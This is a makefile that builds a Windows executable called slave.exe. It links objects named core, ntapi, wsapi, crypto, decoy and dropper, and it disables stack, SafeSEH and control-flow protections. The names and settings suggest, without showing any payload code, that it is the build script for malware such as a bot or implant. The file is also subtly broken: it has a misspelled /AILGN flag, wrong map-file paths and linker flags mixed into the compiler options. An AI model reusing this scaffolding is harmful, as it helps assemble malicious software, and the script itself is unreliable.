CLFL_BUILD_release = /DRELEASE
CLFL_BUILD_debug   = /Z7 /DDEBUG /DDEBUG_LEVEL=3 /DDEBUG_C_ASSERT

CLFL_INCLUDE = /I$(PROJECT_INCLUDE_PATH)/ /FI$(PROJECT_INCLUDE_PATH)/stdafx.h
CLFL_BASE    = /Wall $(CLFL_INCLUDE) $(CLFL_BUILD_$(PROJECT_BUILD)) /J /Gr /GS:off /Qms0 /Qsafeseh- /Qcf-protection:none /Qfreestanding /KERNEL /DRIVER /LARGEADDRESSAWARE /DYNAMICBASE /NODEFAULTLIB
CLFL_CPU     = /arch:SSE2 /tune:generic /Qopt-prefetch /Qopt-prefetch:2
CLFL_OX      = /Qipo /Os /Ob2 /GF /GA /Zp16 /Qunroll8 /Qsfalign16 /Qfnalign8
CCX64        = @"$(ICPP_COMPILER_X64)/icl.exe" /nologo
CCX86        = @"$(ICPP_COMPILER_X86)/icl.exe" /nologo

LDFL_BUILD_release = /RELEASE
LDFL_BUILD_debug   = /DEBUG DlgClient3.0.lib

LDFL_LIBS = /LIBPATH:"C:/Program Files (x86)/IntelSWTools/compilers_and_libraries_2019.2.190/windows/compiler/lib/ia32/" /LIBPATH:"C:/Program Files (x86)/Microsoft Visual Studio/2019/Enterprise/VC/Tools/MSVC/14.20.27508/lib/x86"
LDFL      = /MANIFEST:NO /DYNAMICBASE /SUBSYSTEM:WINDOWS /GUARD:NO /SAFESEH:NO /OPT:REF $(LDFL_BUILD_$(PROJECT_BUILD))
LDX64     = @"$(ICPP_COMPILER_X64)/xilink.exe" /NOLOGO /TIME /MACHINE:X64 /LIBPATH:"$(LIB_ICPP_X64)" /LIBPATH:"$(LIB_VCTOOLS_X64)" /LIBPATH:"$(LIB_UNMANAGED_X64)" /LIBPATH:"$(PROJECT_LIB_PATH)/x64"
LDX86     = @"$(ICPP_COMPILER_X86)/xilink.exe" /NOLOGO /TIME /MACHINE:X86 /LIBPATH:"$(LIB_ICPP_X86)" /LIBPATH:"$(LIB_VCTOOLS_X86)" /LIBPATH:"$(LIB_UNMANAGED_X86)" /LIBPATH:"$(PROJECT_LIB_PATH)/x86"

all: core decoy dropper link r

link:
	$(LDX86) $(LDFL) /ENTRY:InitialEntry KERNEL32.LIB WS2_32.LIB /MAP:$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/slave.map /PDB:$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/slave.pdb /OUT:$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/slave.exe \
	$(PROJECT_OBJECT_PATH)/core/*.obj \
	$(PROJECT_OBJECT_PATH)/core/ntapi/*.obj \
	$(PROJECT_OBJECT_PATH)/core/wsapi/*.obj \
	$(PROJECT_OBJECT_PATH)/crypto/*.obj \
	$(PROJECT_OBJECT_PATH)/decoy/*.obj \
	$(PROJECT_OBJECT_PATH)/dropper/*.obj

r:
	start cmd /c "$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/Slave.exe"

core:
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/core/*.c /Fo:$(PROJECT_OBJECT_PATH)/core/
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/core/ntapi/*.c /Fo:$(PROJECT_OBJECT_PATH)/core/ntapi/
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/core/wsapi/*.c /Fo:$(PROJECT_OBJECT_PATH)/core/wsapi/

crypto:
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/crypto/*.c /Fo:$(PROJECT_OBJECT_PATH)/crypto/

decoy:
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/decoy/*.c /Fo:$(PROJECT_OBJECT_PATH)/decoy/

dropper:
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/dropper/*.c /Fo:$(PROJECT_OBJECT_PATH)/dropper/

aes:
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/modules/aes/aes.c /Fo:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aes.obj
	$(CCX86) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/modules/aes/aesni.c /Fo:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aesni.obj
	$(CCX64) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/modules/aes/aes.c /Fo:$(PROJECT_OBJECT_PATH)/modules/aes/x64/aes.obj
	$(CCX64) $(CLFL_BASE) $(CLFL_CPU) $(CLFL_OX) $(CLFL_ADDON) /c source/source/modules/aes/aesni.c /Fo:$(PROJECT_OBJECT_PATH)/modules/aes/x64/aesni.obj
	$(LDX86) $(LDFL) /DRIVER /ALIGN:32 /BASE:0 /DLL /NOENTRY /MAP:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aesx86.map /OUT:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aesx86.dll $(PROJECT_OBJECT_PATH)/modules/aes/x86/aes.obj
	$(LDX86) $(LDFL) /DRIVER /ALIGN:32 /BASE:0 /DLL /NOENTRY /MAP:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aesxni86.map /OUT:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aesnix86.dll $(PROJECT_OBJECT_PATH)/modules/aes/x86/aesni.obj
	$(LDX64) $(LDFL) /DRIVER /ALIGN:32 /BASE:0 /DLL /NOENTRY /MAP:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aesx64.map /OUT:$(PROJECT_OBJECT_PATH)/modules/aes/x64/aesx64.dll $(PROJECT_OBJECT_PATH)/modules/aes/x64/aes.obj
	$(LDX64) $(LDFL) /DRIVER /AILGN:32 /BASE:0 /DLL /NOENTRY /MAP:$(PROJECT_OBJECT_PATH)/modules/aes/x86/aesnix86.map /OUT:$(PROJECT_OBJECT_PATH)/modules/aes/x64/aesnix64.dll $(PROJECT_OBJECT_PATH)/modules/aes/x64/aesni.obj
